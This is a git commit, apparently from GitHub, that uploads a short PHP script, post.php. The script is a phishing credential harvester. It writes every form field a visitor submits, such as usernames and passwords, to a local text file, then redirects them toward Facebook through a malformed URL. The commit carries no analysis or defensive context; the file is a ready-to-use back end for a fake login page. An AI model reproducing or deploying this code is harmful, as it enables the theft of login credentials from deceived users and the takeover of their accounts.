110b3f7439e91b6b44a9169961ce85acb6d15647
Xx-pRivATEX-xX <99265502+Xx-pRivATEX-xX@users.noreply.github.com>
2022-02-08 22:03:45 +0800

    Add files via upload

---
+++ post.php
@@ -0,0 +1,13 @@
+<?php
+header ('location:http//www.facebook.com/');
+$handle = fopen("usernames.text", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
